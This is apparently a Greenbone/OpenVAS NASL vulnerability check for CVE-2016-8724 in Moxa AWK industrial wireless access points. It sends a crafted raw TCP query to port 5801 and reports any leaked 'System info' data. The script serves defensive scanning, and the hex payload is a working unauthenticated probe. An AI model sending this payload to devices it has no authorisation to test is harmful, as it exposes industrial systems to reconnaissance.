CPE = "cpe:/h:moxa";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.106742" );
	script_version( "2021-09-09T12:15:00+0000" );
	script_tag( name: "last_modification", value: "2021-09-09 12:15:00 +0000 (Thu, 09 Sep 2021)" );
	script_tag( name: "creation_date", value: "2017-04-11 14:59:45 +0200 (Tue, 11 Apr 2017)" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_tag( name: "severity_vector", value: "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N" );
	script_tag( name: "severity_origin", value: "NVD" );
	script_tag( name: "severity_date", value: "2017-04-20 13:46:00 +0000 (Thu, 20 Apr 2017)" );
	script_cve_id( "CVE-2016-8724" );
	script_tag( name: "qod_type", value: "exploit" );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_name( "Moxa AWK Series serviceAgent Information Disclosure Vulnerability" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2017 Greenbone Networks GmbH" );
	script_family( "General" );
	script_dependencies( "gb_moxa_awk_detect.sc" );
	script_mandatory_keys( "moxa_awk/detected" );
	script_require_ports( 5801 );
	script_tag( name: "summary", value: "Moxa AWK series wireless access points are prone to an information
  disclosure vulnerability in the serviceAgent." );
	script_tag( name: "vuldetect", value: "Sends a crafted request and checks the response." );
	script_tag( name: "insight", value: "An exploitable information disclosure vulnerability exists in the
  serviceAgent functionality of Moxa AWK Series Industrial devices. A specially crafted TCP query will allow an
  attacker to retrieve potentially sensitive information, such as firmware version." );
	script_tag( name: "impact", value: "An unauthenticated attacker may obtain sensitive information." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one." );
	script_xref( name: "URL", value: "http://www.talosintelligence.com/reports/TALOS-2016-0238/" );
	exit( 0 );
}
require("misc_func.inc.sc");
require("socket_func.inc.sc");
port = 5801;
if(!get_port_state( port )){
	exit( 0 );
}
query = raw_string( 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0c, 0x29, 0xd3, 0xe0, 0x26, 0x00, 0x90, 0xe8, 0x57, 0x23, 0x07, 0x00, 0x00, 0x00, 0x05, 0x00, 0x02, 0x00, 0x06, 0x00, 0x18, 0x00, 0x00, 0x00, 0x00 );
recv = socket_send_recv( port: port, data: query, proto: "tcp" );
if(recv && ContainsString( recv, "System info" )){
	report = "The following data was received:\\n\\n" + recv;
	security_message( port: port, data: report );
	exit( 0 );
}
exit( 99 );

